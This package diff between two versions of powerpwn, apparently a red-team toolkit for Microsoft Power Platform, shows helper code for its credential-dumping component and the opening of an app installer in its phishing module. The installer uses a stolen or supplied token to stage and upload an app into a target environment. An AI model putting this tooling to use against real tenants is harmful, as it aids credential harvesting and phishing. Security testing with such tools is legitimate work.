-          <td>{{ connection.display_name }}</td>
-          <td>{{ connection.environment_id }}</td>
-          <td>{{ connection.is_valid }}</td>
-          <td>{{ connection.last_modified_at }}</td>
-          <td>{{ connection.expiration_time }}</td>
-          <td>{{ connection.created_by.email }}</td>
-          <td>{{ connection.shareable }}</td>
-          <td><a href="/api/{{ connection.connector_id }}/{{ connection.connection_id }}">Playground</a></td>
-          <td><a href="/automation/{{ connection.environment_id }}/{{ connection.entity_id }}">Raw</a> </td>
-        </tr>
-      {% endfor %}
-    </tbody>
-  </table>
-{% endblock %}
-
-{% block scripts %}
-  <script>
-    $(document).ready(function () {
-      $('#data').DataTable({
-        scrollX: true
-      });
-    });
-  </script>
+{% extends "base.html" %}
+
+{% block content %}
+  <table id="data" class="table table-striped">
+    <thead>
+      <tr>
+        <th></th>
+        <th>Connector</th>
+        <th>Connection</th>
+        <th>Environment </th>
+        <th>Is valid</th>
+        <th>Last modified at</th>
+        <th>Expires at</th>
+        <th>Created by</th>
+        <th>Shareable</th>
+      </tr>
+    </thead>
+    <tbody>
+      {% for connection in resources %}
+        <tr>
+          <td><img src="{{ connection.icon_uri }}" class="img-thumbnail" alt="{{ connection.connection_id }}" width="25"></td>
+          <td><a href="/credentials/{{ connection.connector_id }}">{{ connection.connector_id }}</a></td>
+          <td>{{ connection.display_name }}</td>
+          <td><a href="/env/{{ connection.environment_id }}/credentials">{{ connection.environment_id }}</a> </td>
+          <td>{{ connection.is_valid }}</td>
+          <td>{{ connection.last_modified_at }}</td>
+          <td>{{ connection.expiration_time }}</td>
+          <td>{{ connection.created_by.email }}</td>
+          <td>{{ connection.shareable }}</td>
+          <td><a href="/api/{{ connection.connector_id }}/{{ connection.connection_id }}">Playground</a></td>
+          <td><a href="/env/{{ connection.environment_id }}/credentials/{{ connection.entity_id }}">Raw</a> </td>
+          <td><a href="http://127.0.0.1:8080/browse/data/{{ connection.environment_id }}/connections/{{connection.connector_id}}/{{connection.entity_id}}" target="_blank">Dump</a> </td>
+        </tr>
+      {% endfor %}
+    </tbody>
+  </table>
+{% endblock %}
+
+{% block scripts %}
+  <script>
+    $(document).ready(function () {
+      $('#data').DataTable({
+        scrollX: true
+      });
+    });
+  </script>
 {% endblock %}
```

### Comparing `powerpwn-2.1.4/src/powerpwn/powerdump/utils/json_utils.py` & `powerpwn-2.1.5/src/powerpwn/powerdump/utils/json_utils.py`

 * *Ordering differences only*

 * *Files 10% similar despite different names*

```diff
@@ -1,114 +1,114 @@
-"""
-Copied from AFK
-"""
-
-import json
-import logging
-from typing import Any, Callable, Dict, List, Optional, Tuple, Union
-
-from powerpwn.cli.const import LOGGER_NAME
-from powerpwn.powerdump.collect.models.base_entity import BaseEntity
-
-logger = logging.getLogger(LOGGER_NAME)
-
-
-def _flatten_nested_dict(val: Any, prefix: str = "") -> List[Tuple[Any, Any]]:
-    res = []
-    if isinstance(val, (str, int, float, bool)) or val is None:
-        res.append((val, prefix))
-    elif isinstance(val, dict):
-        for k in val.keys():
-            res.extend(_flatten_nested_dict(val[k], f"{prefix}.{k}"))
-    elif isinstance(val, (list, tuple)):
-        for i in range(len(val)):
-            res.extend(_flatten_nested_dict(val[i], f"{prefix}.{i}"))
-    elif isinstance(val, BaseEntity):
-        res.extend(_flatten_nested_dict(json.loads(val.json()), prefix))
-    else:
-        raise ValueError(f"Unsupported type {type(val)}.")
-    return res
-
-
-def flatten_nested_dict(val: Any) -> Dict[Any, Any]:
-    """
-    Flatten nested dict recursively
-    @param val: nested dict
-    @return: flattened dict
-    """
-    res = _flatten_nested_dict(val)
-    return {key: val for val, key in res}
-
-
-def deep_compare_nested_dict(val_one: Any, val_two: Any, allow_additional_keys: bool = False) -> bool:
-    """
-    Compare nested dict recursively
-    @param val_one: first nested dict
-    @param val_two: second nested dict
-    @param allow_additional_keys: if True, val_one and val_two are allowed to contains nested properties that are not present in the other.
-    @return: whether the two dicts are equal in all nested properties
-    """
-    val_one_flat = flatten_nested_dict(val_one)
-    val_two_flat = flatten_nested_dict(val_two)
-
-    val_one_key_set = set(val_one_flat.keys())
-    val_two_key_set = set(val_two_flat.keys())
-
-    missing_key_from_val_one = val_one_key_set.difference(val_two_key_set)
-    if len(missing_key_from_val_one) > 0:
-        logger.debug(f"val_two is missing the following elements from val_one: {missing_key_from_val_one}.")
-        if not allow_additional_keys:
-            return False
-
-    missing_key_from_val_two = val_two_key_set.difference(val_one_key_set)
-    if len(missing_key_from_val_two) > 0:
-        logger.debug(f"val_one is missing the following elements from val_two: {missing_key_from_val_two}.")
-        if not allow_additional_keys:
-            return False
-
-    mutual_keys = val_one_key_set.intersection(val_two_key_set)
-    for k in mutual_keys:
-        # pydantic and json load can change type of int, bool and more from str
-        if not json_consistent_compare(val_one_flat[k], val_two_flat[k]):
-            logger.debug(f"Value for key {k} does not align.")
-            return False
-
-    return True
-
-
-def json_consistent_compare(val_one: Optional[Union[str, int, bool, float]], val_two: Optional[Union[str, int, bool, float]]) -> bool:
-    """
-    Compares values in a way consistent with json dump and load.
-    I.e, json_consistent_compare(val, json.loads(json.dumps(val))) is True.
-    @param val_one: value to compare.
-    @param val_two: value to compare.
-    @return: whether the two values are equal in a way consistent with json dump and load.
-    """
-    if isinstance(val_one, type(val_two)) or isinstance(val_one, bool) or isinstance(val_two, bool):
-        return val_one == val_two
-    elif isinstance(val_one, str) or isinstance(val_two, str):
-        return str(val_one) == str(val_two)
-    elif isinstance(val_one, str) or isinstance(val_two, str):
-        return str(val_one) == str(val_two)
-    elif isinstance(val_one, int) and isinstance(val_two, float):
-        return float(val_one) == val_two
-    elif isinstance(val_two, int) and isinstance(val_one, float):
-        return float(val_two) == val_one
-    else:
-        raise ValueError(f"Unsupported type combination {type(val_one)}, {type(val_one)}.")
-
-
-def change_obj_recu(val: Any, obj_changer: Callable[[dict], None]) -> None:
-    if isinstance(val, (str, int, float, bool)) or val is None:
-        return
-    elif isinstance(val, dict):
-        obj_changer(val)
-
-        for k in val.keys():
-            change_obj_recu(val[k], obj_changer=obj_changer)
-    elif isinstance(val, (list, tuple)):
-        for i in range(len(val)):
-            change_obj_recu(val[i], obj_changer=obj_changer)
-    elif isinstance(val, BaseEntity):
-        change_obj_recu(val.json(), obj_changer=obj_changer)
-    else:
-        raise ValueError(f"Unsupported type {type(val)}.")
+"""
+Copied from AFK
+"""
+
+import json
+import logging
+from typing import Any, Callable, Dict, List, Optional, Tuple, Union
+
+from powerpwn.cli.const import LOGGER_NAME
+from powerpwn.powerdump.collect.models.base_entity import BaseEntity
+
+logger = logging.getLogger(LOGGER_NAME)
+
+
+def _flatten_nested_dict(val: Any, prefix: str = "") -> List[Tuple[Any, Any]]:
+    res = []
+    if isinstance(val, (str, int, float, bool)) or val is None:
+        res.append((val, prefix))
+    elif isinstance(val, dict):
+        for k in val.keys():
+            res.extend(_flatten_nested_dict(val[k], f"{prefix}.{k}"))
+    elif isinstance(val, (list, tuple)):
+        for i in range(len(val)):
+            res.extend(_flatten_nested_dict(val[i], f"{prefix}.{i}"))
+    elif isinstance(val, BaseEntity):
+        res.extend(_flatten_nested_dict(json.loads(val.json()), prefix))
+    else:
+        raise ValueError(f"Unsupported type {type(val)}.")
+    return res
+
+
+def flatten_nested_dict(val: Any) -> Dict[Any, Any]:
+    """
+    Flatten nested dict recursively
+    @param val: nested dict
+    @return: flattened dict
+    """
+    res = _flatten_nested_dict(val)
+    return {key: val for val, key in res}
+
+
+def deep_compare_nested_dict(val_one: Any, val_two: Any, allow_additional_keys: bool = False) -> bool:
+    """
+    Compare nested dict recursively
+    @param val_one: first nested dict
+    @param val_two: second nested dict
+    @param allow_additional_keys: if True, val_one and val_two are allowed to contains nested properties that are not present in the other.
+    @return: whether the two dicts are equal in all nested properties
+    """
+    val_one_flat = flatten_nested_dict(val_one)
+    val_two_flat = flatten_nested_dict(val_two)
+
+    val_one_key_set = set(val_one_flat.keys())
+    val_two_key_set = set(val_two_flat.keys())
+
+    missing_key_from_val_one = val_one_key_set.difference(val_two_key_set)
+    if len(missing_key_from_val_one) > 0:
+        logger.debug(f"val_two is missing the following elements from val_one: {missing_key_from_val_one}.")
+        if not allow_additional_keys:
+            return False
+
+    missing_key_from_val_two = val_two_key_set.difference(val_one_key_set)
+    if len(missing_key_from_val_two) > 0:
+        logger.debug(f"val_one is missing the following elements from val_two: {missing_key_from_val_two}.")
+        if not allow_additional_keys:
+            return False
+
+    mutual_keys = val_one_key_set.intersection(val_two_key_set)
+    for k in mutual_keys:
+        # pydantic and json load can change type of int, bool and more from str
+        if not json_consistent_compare(val_one_flat[k], val_two_flat[k]):
+            logger.debug(f"Value for key {k} does not align.")
+            return False
+
+    return True
+
+
+def json_consistent_compare(val_one: Optional[Union[str, int, bool, float]], val_two: Optional[Union[str, int, bool, float]]) -> bool:
+    """
+    Compares values in a way consistent with json dump and load.
+    I.e, json_consistent_compare(val, json.loads(json.dumps(val))) is True.
+    @param val_one: value to compare.
+    @param val_two: value to compare.
+    @return: whether the two values are equal in a way consistent with json dump and load.
+    """
+    if isinstance(val_one, type(val_two)) or isinstance(val_one, bool) or isinstance(val_two, bool):
+        return val_one == val_two
+    elif isinstance(val_one, str) or isinstance(val_two, str):
+        return str(val_one) == str(val_two)
+    elif isinstance(val_one, str) or isinstance(val_two, str):
+        return str(val_one) == str(val_two)
+    elif isinstance(val_one, int) and isinstance(val_two, float):
+        return float(val_one) == val_two
+    elif isinstance(val_two, int) and isinstance(val_one, float):
+        return float(val_two) == val_one
+    else:
+        raise ValueError(f"Unsupported type combination {type(val_one)}, {type(val_one)}.")
+
+
+def change_obj_recu(val: Any, obj_changer: Callable[[dict], None]) -> None:
+    if isinstance(val, (str, int, float, bool)) or val is None:
+        return
+    elif isinstance(val, dict):
+        obj_changer(val)
+
+        for k in val.keys():
+            change_obj_recu(val[k], obj_changer=obj_changer)
+    elif isinstance(val, (list, tuple)):
+        for i in range(len(val)):
+            change_obj_recu(val[i], obj_changer=obj_changer)
+    elif isinstance(val, BaseEntity):
+        change_obj_recu(val.json(), obj_changer=obj_changer)
+    else:
+        raise ValueError(f"Unsupported type {type(val)}.")
```

### Comparing `powerpwn-2.1.4/src/powerpwn/powerdump/utils/model_loaders.py` & `powerpwn-2.1.5/src/powerpwn/powerdump/utils/model_loaders.py`

 * *Files 14% similar despite different names*

```diff
@@ -1,129 +1,130 @@
-import json
-import os
-import pathlib
-from typing import Dict, Generator, List, Optional, Tuple
-
-from powerpwn.powerdump.collect.models.canvas_app_entity import CanvasApp
-from powerpwn.powerdump.collect.models.connection_entity import Connection
-from powerpwn.powerdump.collect.models.connector_entity import Connector
-from powerpwn.powerdump.collect.models.resource_entity_base import ResourceEntityBase
-from powerpwn.powerdump.collect.resources_collectors.enums.resource_type import ResourceType
-from powerpwn.powerdump.utils.path_utils import entities_path, env_entity_type_path
-
-
-def load_resources(cache_path: str, env_id: Optional[str] = None) -> Generator[ResourceEntityBase, None, None]:
-    yield from load_connections(cache_path, env_id)
-    yield from load_canvasapps(cache_path, env_id)
-    yield from load_connectors(cache_path, env_id)
-
-
-def load_connections(cache_path: str, env_id: Optional[str] = None, with_logic_flows: bool = True) -> Generator[Connection, None, None]:
-    cache = pathlib.Path(entities_path(cache_path))
-    if env_id:
-        connections = cache.glob(f"{env_id}/{ResourceType.connection}/*.json")
-    else:
-        connections = cache.glob(f"*/{ResourceType.connection}/*.json")
-    for connection in connections:
-        connection_path = "/".join(list(connection.parts))
-        with open(connection_path, "r") as fp:
-            raw_connection = json.load(fp)
-            parsed_connection = Connection.parse_obj(raw_connection)
-            if parsed_connection.connector_id == "shared_logicflows" and not with_logic_flows:
-                continue
-            yield parsed_connection
-
-
-def load_logic_flows(cache_path: str, env_id: Optional[str] = None) -> Generator[Connection, None, None]:
-    cache = pathlib.Path(entities_path(cache_path))
-    if env_id:
-        connections = cache.glob(f"{env_id}/{ResourceType.connection}/*.json")
-    else:
-        connections = cache.glob(f"*/{ResourceType.connection}/*.json")
-    for connection in connections:
-        connection_path = "/".join(list(connection.parts))
-        with open(connection_path, "r") as fp:
-            raw_connection = json.load(fp)
-            parsed_connection = Connection.parse_obj(raw_connection)
-            if not parsed_connection.connector_id == "shared_logicflows":
-                continue
-            yield parsed_connection
-
-
-def load_canvasapps(cache_path: str, env_id: Optional[str] = None) -> Generator[CanvasApp, None, None]:
-    cache = pathlib.Path(entities_path(cache_path))
-    if env_id:
-        apps = cache.glob(f"{env_id}/{ResourceType.canvas_app}/*.json")
-    else:
-        apps = cache.glob(f"*/{ResourceType.canvas_app}/*.json")
-    for app in apps:
-        canvasapps_path = "/".join(list(app.parts))
-        with open(canvasapps_path, "r") as fp:
-            raw_app = json.load(fp)
-            parsed_app = CanvasApp.parse_obj(raw_app)
-            yield parsed_app
-
-
-def get_canvasapp(cache_path: str, env_id: str, app_id: str) -> CanvasApp:
-    canvas_apps_in_env_path = env_entity_type_path(env_id, ResourceType.canvas_app, cache_path)
-    app_path = pathlib.Path(f"{canvas_apps_in_env_path}/{app_id}.json")
-    with open(app_path, "r") as fp:
-        raw_app = json.load(fp)
-        return CanvasApp.parse_obj(raw_app)
-
-
-def get_connection(cache_path: str, env_id: str, connection_id: str) -> Connection:
-    canvas_apps_in_env_path = env_entity_type_path(env_id, ResourceType.connection, cache_path)
-    app_path = pathlib.Path(f"{canvas_apps_in_env_path}/{connection_id}.json")
-    with open(app_path, "r") as fp:
-        raw_app = json.load(fp)
-        return Connection.parse_obj(raw_app)
-
-
-def get_connector(cache_path: str, env_id: str, api_name: str) -> Connector:
-    connectors_path = env_entity_type_path(env_id, ResourceType.connector, cache_path)
-    with open(os.path.join(connectors_path, api_name + ".json")) as fp:
-        spec = Connector.parse_obj(json.load(fp))
-        return spec
-
-
-def load_connectors(cache_path: str, env_id: Optional[str] = None) -> Generator[Connector, None, None]:
-    cache = pathlib.Path(entities_path(cache_path))
-    if env_id:
-        connectors = cache.glob(f"{env_id}/{ResourceType.connector}/*.json")
-    else:
-        connectors = cache.glob(f"*/{ResourceType.connector}/*.json")
-
-    for connector in connectors:
-        connector_file = "/".join(list(connector.parts))
-        with open(connector_file, "r") as fp:
-            raw_spec = json.load(fp)
-            parsed_spec = Connector.parse_obj(raw_spec)
-            yield parsed_spec
-
-
-def get_environment_ids(cache_path: str) -> List[str]:
-    if not os.path.exists(cache_path):
-        return []
-    return os.listdir(entities_path(cache_path))
-
-
-def map_connection_id_to_connector_id_and_env_id(connections: Generator[Connection, None, None]) -> Dict[str, Tuple[str, str]]:
-    connection_id_to_connector_id_and_env_id: Dict[str, Tuple[str, str]] = dict()
-    for connection in connections:
-        connection_id_to_connector_id_and_env_id[connection.connection_id] = connection_id_to_connector_id_and_env_id.get(
-            connection.connection_id, (connection.connector_id, connection.environment_id)
-        )
-
-    return connection_id_to_connector_id_and_env_id
-
-
-def map_connector_id_and_env_id_to_connection_ids(connections: Generator[Connection, None, None]) -> Dict[Tuple[str, str], List[str]]:
-    connector_id_and_env_id_to_connection_ids: Dict[Tuple[str, str], List[str]] = dict()
-    for connection in connections:
-        if connection.environment_id.startswith("default"):
-            connection.environment_id = connection.environment_id.replace("default", "Default")
-        connector_id_and_env_id_to_connection_ids[
-            (connection.connector_id, connection.environment_id)
-        ] = connector_id_and_env_id_to_connection_ids.get((connection.connector_id, connection.environment_id), []) + [connection.connection_id]
-
-    return connector_id_and_env_id_to_connection_ids
+import json
+import os
+import pathlib
+from typing import Dict, Generator, List, Optional, Tuple
+
+from powerpwn.powerdump.collect.models.canvas_app_entity import CanvasApp
+from powerpwn.powerdump.collect.models.connection_entity import Connection
+from powerpwn.powerdump.collect.models.connector_entity import Connector
+from powerpwn.powerdump.collect.models.resource_entity_base import ResourceEntityBase
+from powerpwn.powerdump.collect.resources_collectors.enums.resource_type import ResourceType
+from powerpwn.powerdump.utils.path_utils import entities_path, env_entity_type_path
+
+
+def load_resources(cache_path: str, env_id: Optional[str] = None) -> Generator[ResourceEntityBase, None, None]:
+    yield from load_connections(cache_path, env_id)
+    yield from load_canvasapps(cache_path, env_id)
+    yield from load_connectors(cache_path, env_id)
+
+
+def load_connections(cache_path: str, env_id: Optional[str] = None, with_logic_flows: bool = True) -> Generator[Connection, None, None]:
+    cache = pathlib.Path(entities_path(cache_path))
+    if env_id:
+        connections = cache.glob(f"{env_id}/{ResourceType.connection}/*.json")
+    else:
+        connections = cache.glob(f"*/{ResourceType.connection}/*.json")
+    for connection in connections:
+        connection_path = "/".join(list(connection.parts))
+        with open(connection_path, "r") as fp:
+            raw_connection = json.load(fp)
+            parsed_connection = Connection.parse_obj(raw_connection)
+            if parsed_connection.connector_id == "shared_logicflows" and not with_logic_flows:
+                continue
+            yield parsed_connection
+
+
+def load_logic_flows(cache_path: str, env_id: Optional[str] = None) -> Generator[Connection, None, None]:
+    cache = pathlib.Path(entities_path(cache_path))
+    if env_id:
+        connections = cache.glob(f"{env_id}/{ResourceType.connection}/*.json")
+    else:
+        connections = cache.glob(f"*/{ResourceType.connection}/*.json")
+    for connection in connections:
+        connection_path = "/".join(list(connection.parts))
+        with open(connection_path, "r") as fp:
+            raw_connection = json.load(fp)
+            parsed_connection = Connection.parse_obj(raw_connection)
+            if not parsed_connection.connector_id == "shared_logicflows":
+                continue
+            yield parsed_connection
+
+
+def load_canvasapps(cache_path: str, env_id: Optional[str] = None) -> Generator[CanvasApp, None, None]:
+    cache = pathlib.Path(entities_path(cache_path))
+    if env_id:
+        apps = cache.glob(f"{env_id}/{ResourceType.canvas_app}/*.json")
+    else:
+        apps = cache.glob(f"*/{ResourceType.canvas_app}/*.json")
+    for app in apps:
+        canvasapps_path = "/".join(list(app.parts))
+        with open(canvasapps_path, "r") as fp:
+            raw_app = json.load(fp)
+            parsed_app = CanvasApp.parse_obj(raw_app)
+            yield parsed_app
+
+
+def get_canvasapp(cache_path: str, env_id: str, app_id: str) -> CanvasApp:
+    canvas_apps_in_env_path = env_entity_type_path(env_id, ResourceType.canvas_app, cache_path)
+    app_path = pathlib.Path(f"{canvas_apps_in_env_path}/{app_id}.json")
+    with open(app_path, "r") as fp:
+        raw_app = json.load(fp)
+        return CanvasApp.parse_obj(raw_app)
+
+
+def get_connection(cache_path: str, env_id: str, connection_id: str) -> Connection:
+    canvas_apps_in_env_path = env_entity_type_path(env_id, ResourceType.connection, cache_path)
+    app_path = pathlib.Path(f"{canvas_apps_in_env_path}/{connection_id}.json")
+    with open(app_path, "r") as fp:
+        raw_app = json.load(fp)
+        return Connection.parse_obj(raw_app)
+
+
+def get_connector(cache_path: str, env_id: str, api_name: str) -> Connector:
+    connectors_path = env_entity_type_path(env_id, ResourceType.connector, cache_path)
+    with open(os.path.join(connectors_path, api_name + ".json")) as fp:
+        spec = Connector.parse_obj(json.load(fp))
+        return spec
+
+
+def load_connectors(cache_path: str, env_id: Optional[str] = None) -> Generator[Connector, None, None]:
+    cache = pathlib.Path(entities_path(cache_path))
+    if env_id:
+        connectors = cache.glob(f"{env_id}/{ResourceType.connector}/*.json")
+    else:
+        connectors = cache.glob(f"*/{ResourceType.connector}/*.json")
+
+    for connector in connectors:
+        connector_file = "/".join(list(connector.parts))
+        with open(connector_file, "r") as fp:
+            raw_spec = json.load(fp)
+            parsed_spec = Connector.parse_obj(raw_spec)
+            yield parsed_spec
+
+
+def get_environment_ids(cache_path: str) -> List[str]:
+    resources_path = entities_path(cache_path)
+    if not os.path.exists(cache_path) or not os.path.exists(resources_path):
+        return []
+    return os.listdir(resources_path)
+
+
+def map_connection_id_to_connector_id_and_env_id(connections: Generator[Connection, None, None]) -> Dict[str, Tuple[str, str]]:
+    connection_id_to_connector_id_and_env_id: Dict[str, Tuple[str, str]] = dict()
+    for connection in connections:
+        connection_id_to_connector_id_and_env_id[connection.connection_id] = connection_id_to_connector_id_and_env_id.get(
+            connection.connection_id, (connection.connector_id, connection.environment_id)
+        )
+
+    return connection_id_to_connector_id_and_env_id
+
+
+def map_connector_id_and_env_id_to_connection_ids(connections: Generator[Connection, None, None]) -> Dict[Tuple[str, str], List[str]]:
+    connector_id_and_env_id_to_connection_ids: Dict[Tuple[str, str], List[str]] = dict()
+    for connection in connections:
+        if connection.environment_id.startswith("default"):
+            connection.environment_id = connection.environment_id.replace("default", "Default")
+        connector_id_and_env_id_to_connection_ids[(connection.connector_id, connection.environment_id)] = (
+            connector_id_and_env_id_to_connection_ids.get((connection.connector_id, connection.environment_id), []) + [connection.connection_id]
+        )
+
+    return connector_id_and_env_id_to_connection_ids
```

### Comparing `powerpwn-2.1.4/src/powerpwn/powerdump/utils/path_utils.py` & `powerpwn-2.1.5/src/powerpwn/powerdump/utils/path_utils.py`

 * *Ordering differences only*

 * *Files 14% similar despite different names*

```diff
@@ -1,30 +1,30 @@
-from powerpwn.powerdump.collect.resources_collectors.enums.resource_type import ResourceType
-from powerpwn.powerdump.utils.const import CACHE_PATH
-
-
-def entities_path(cache_path: str = CACHE_PATH) -> str:
-    return f"{cache_path}/resources"
-
-
-def env_entities_path(env_id: str, cache_path: str = CACHE_PATH) -> str:
-    return f"{cache_path}/resources/{env_id}"
-
-
-def env_entity_type_path(env_id: str, entity_type: ResourceType, cache_path: str = CACHE_PATH) -> str:
-    return f"{cache_path}/resources/{env_id}/{entity_type.value}"
-
-
-def dump_path(cache_path: str = CACHE_PATH) -> str:
-    return f"{cache_path}/dump"
-
-
-def collected_data_path(cache_path: str = CACHE_PATH) -> str:
-    return f"{cache_path}/data"
-
-
-def env_collected_data_path(env_id: str, cache_path: str = CACHE_PATH) -> str:
-    return f"{collected_data_path(cache_path)}/{env_id}"
-
-
-def resource_collected_data_path(env_id: str, resource_id: str, resource_type: ResourceType, cache_path: str = CACHE_PATH) -> str:
-    return f"{env_collected_data_path(env_id, cache_path)}/{resource_type}/{resource_id}"
+from powerpwn.powerdump.collect.resources_collectors.enums.resource_type import ResourceType
+from powerpwn.powerdump.utils.const import CACHE_PATH
+
+
+def entities_path(cache_path: str = CACHE_PATH) -> str:
+    return f"{cache_path}/resources"
+
+
+def env_entities_path(env_id: str, cache_path: str = CACHE_PATH) -> str:
+    return f"{cache_path}/resources/{env_id}"
+
+
+def env_entity_type_path(env_id: str, entity_type: ResourceType, cache_path: str = CACHE_PATH) -> str:
+    return f"{cache_path}/resources/{env_id}/{entity_type.value}"
+
+
+def dump_path(cache_path: str = CACHE_PATH) -> str:
+    return f"{cache_path}/dump"
+
+
+def collected_data_path(cache_path: str = CACHE_PATH) -> str:
+    return f"{cache_path}/data"
+
+
+def env_collected_data_path(env_id: str, cache_path: str = CACHE_PATH) -> str:
+    return f"{collected_data_path(cache_path)}/{env_id}"
+
+
+def resource_collected_data_path(env_id: str, resource_id: str, resource_type: ResourceType, cache_path: str = CACHE_PATH) -> str:
+    return f"{env_collected_data_path(env_id, cache_path)}/{resource_type}/{resource_id}"
```

### Comparing `powerpwn-2.1.4/src/powerpwn/powerdump/utils/requests_wrapper.py` & `powerpwn-2.1.5/src/powerpwn/powerdump/utils/requests_wrapper.py`

 * *Ordering differences only*

 * *Files 20% similar despite different names*

```diff
@@ -1,88 +1,88 @@
-import logging
-import time
-from typing import Any, Dict, List, Optional
-
-import requests
-
-from powerpwn.cli.const import LOGGER_NAME, TOOL_NAME
-
-logger = logging.getLogger(LOGGER_NAME)
-
-
-def init_session(token: str) -> requests.Session:
-    session = requests.Session()
-    session.headers = {"accept": "application/json", "Authorization": token, "User-Agent": TOOL_NAME}
-    return session
-
-
-def consecutive_gets(
-    session: requests.Session,
-    expected_status_prefix: str = "200",
-    property_to_extract_data: str = "value",
-    property_for_pagination: str = "continuationToken",
-    **kwargs,
-):
-    value: List[Dict[str, Any]] = []
-    success = False
-    cont_token = ""  # nosec
-
-    resp_obj = {property_for_pagination: "NOT_EMPTY"}
-    while resp_obj.get(property_for_pagination) not in (None, cont_token):
-        cont_token = resp_obj.get(property_for_pagination, "")
-
-        success, _, resp_obj = request_and_verify(session=session, expected_status_prefix=expected_status_prefix, method="get", **kwargs)
-        if not success:
-            break
-
-        if property_to_extract_data not in resp_obj and value != []:
-            raise ValueError("Inconsistent responses.")
-        if property_to_extract_data not in resp_obj and value == []:
-            logger.warning(f"Expected an array response, received an object: {resp_obj}. Request: {kwargs}.")
-            success = True
-            value += [resp_obj]
-        else:
-            success = True
-            value += resp_obj[property_to_extract_data]
-
-    return success, value
-
-
-def request_and_verify(session: requests.Session, expected_status_prefix: str = "200", is_json_resp: bool = True, **kwargs):
-    success = False
-    resp_obj = None
-    resp_head = None
-
-    logger.debug(f"Triggering request ({kwargs}).")
-    resp = session.request(**kwargs)
-    resp_obj = __get_resp_obj(resp) if is_json_resp else resp.text
-    if str(resp.status_code).startswith(expected_status_prefix):
-        resp_head = resp.headers
-        success = True
-    else:
-        if resp.status_code == 429:
-            __handle_throttling(resp_obj)
-            return request_and_verify(session, expected_status_prefix, **kwargs)
-        logger.info(f"Failed at request ({kwargs}) with status_code={resp.status_code} and content={str(resp.content)}.")
-
-    return success, resp_head, resp_obj
-
-
-def __get_resp_obj(resp) -> Optional[Dict]:
-    resp_obj = None
-    try:
-        resp_obj = resp.json()
-    except requests.exceptions.JSONDecodeError:
-        return None
-
-    return resp_obj
-
-
-def __handle_throttling(resp_obj) -> None:
-    message = resp_obj.get("message", "") if resp_obj else ""
-    throttling_message_prefix = "Rate limit is exceeded. Try again in "
-    if throttling_message_prefix in message:
-        seconds_to_wait = int(message.partition(throttling_message_prefix)[2].partition(" seconds")[0])
-        logger.info(f"API throttled, going to sleep {seconds_to_wait + 1} before retry")
-        time.sleep(seconds_to_wait + 1)
-    else:
-        time.sleep(20)
+import logging
+import time
+from typing import Any, Dict, List, Optional
+
+import requests
+
+from powerpwn.cli.const import LOGGER_NAME, TOOL_NAME
+
+logger = logging.getLogger(LOGGER_NAME)
+
+
+def init_session(token: str) -> requests.Session:
+    session = requests.Session()
+    session.headers = {"accept": "application/json", "Authorization": token, "User-Agent": TOOL_NAME}
+    return session
+
+
+def consecutive_gets(
+    session: requests.Session,
+    expected_status_prefix: str = "200",
+    property_to_extract_data: str = "value",
+    property_for_pagination: str = "continuationToken",
+    **kwargs,
+):
+    value: List[Dict[str, Any]] = []
+    success = False
+    cont_token = ""  # nosec
+
+    resp_obj = {property_for_pagination: "NOT_EMPTY"}
+    while resp_obj.get(property_for_pagination) not in (None, cont_token):
+        cont_token = resp_obj.get(property_for_pagination, "")
+
+        success, _, resp_obj = request_and_verify(session=session, expected_status_prefix=expected_status_prefix, method="get", **kwargs)
+        if not success:
+            break
+
+        if property_to_extract_data not in resp_obj and value != []:
+            raise ValueError("Inconsistent responses.")
+        if property_to_extract_data not in resp_obj and value == []:
+            logger.warning(f"Expected an array response, received an object: {resp_obj}. Request: {kwargs}.")
+            success = True
+            value += [resp_obj]
+        else:
+            success = True
+            value += resp_obj[property_to_extract_data]
+
+    return success, value
+
+
+def request_and_verify(session: requests.Session, expected_status_prefix: str = "200", is_json_resp: bool = True, **kwargs):
+    success = False
+    resp_obj = None
+    resp_head = None
+
+    logger.debug(f"Triggering request ({kwargs}).")
+    resp = session.request(**kwargs)
+    resp_obj = __get_resp_obj(resp) if is_json_resp else resp.text
+    if str(resp.status_code).startswith(expected_status_prefix):
+        resp_head = resp.headers
+        success = True
+    else:
+        if resp.status_code == 429:
+            __handle_throttling(resp_obj)
+            return request_and_verify(session, expected_status_prefix, **kwargs)
+        logger.info(f"Failed at request ({kwargs}) with status_code={resp.status_code} and content={str(resp.content)}.")
+
+    return success, resp_head, resp_obj
+
+
+def __get_resp_obj(resp) -> Optional[Dict]:
+    resp_obj = None
+    try:
+        resp_obj = resp.json()
+    except requests.exceptions.JSONDecodeError:
+        return None
+
+    return resp_obj
+
+
+def __handle_throttling(resp_obj) -> None:
+    message = resp_obj.get("message", "") if resp_obj else ""
+    throttling_message_prefix = "Rate limit is exceeded. Try again in "
+    if throttling_message_prefix in message:
+        seconds_to_wait = int(message.partition(throttling_message_prefix)[2].partition(" seconds")[0])
+        logger.info(f"API throttled, going to sleep {seconds_to_wait + 1} before retry")
+        time.sleep(seconds_to_wait + 1)
+    else:
+        time.sleep(20)
```

### Comparing `powerpwn-2.1.4/src/powerpwn/powerphishing/app_installer.py` & `powerpwn-2.1.5/src/powerpwn/powerphishing/app_installer.py`

 * *Ordering differences only*

 * *Files 14% similar despite different names*

```diff
@@ -1,201 +1,201 @@
-import json
-import logging
-import os
-from time import sleep
-from typing import Any, Dict, Union
-
-from requests import Response
-
-from powerpwn.cli.const import LOGGER_NAME
-from powerpwn.powerdump.utils.requests_wrapper import init_session
-
-logger = logging.getLogger(LOGGER_NAME)
-
-
-class AppInstaller:
-    def __init__(self, token: str) -> None:
-        self.__session = init_session(token)
-
-    def install_app(self, path_to_zip_file: str, app_display_name: str, env_id: str) -> None:
-        if not os.path.exists(path_to_zip_file):
-            logger.error(f"Could not find file: {path_to_zip_file}")
-            return None
-
-        _, file_name = os.path.split(path_to_zip_file)
-
-        self.__session.headers.update({"Accept-Encoding": "gzip, deflate, br", "accept": "application/json, text/plain, */*"})
-        # prepare storage
-        logger.info("Preparing app storage")
-        res = self.__session.post(
-            f"https://api.bap.microsoft.com/providers/Microsoft.BusinessAppPlatform/environments/{env_id}/generateResourceStorage?api-version=2016-11-01"
-        )
-        if res.status_code != 200:
-            self.__log_error("Could not generate app storage", res)
-            return None
-
-        # upload zip file
-        logger.info("Uploading zip file")
-        shared_access_sig = json.loads(res.text)["sharedAccessSignature"]
-        self.__session.headers.update({"X-Ms-Blob-Type": "BlockBlob"})
-        auth = self.__session.headers.pop("Authorization")
-
-        shared_access_splitted = shared_access_sig.split("?")
-        zip_files_shared_access = shared_access_splitted[0] + f"/{file_name}?" + shared_access_splitted[1]
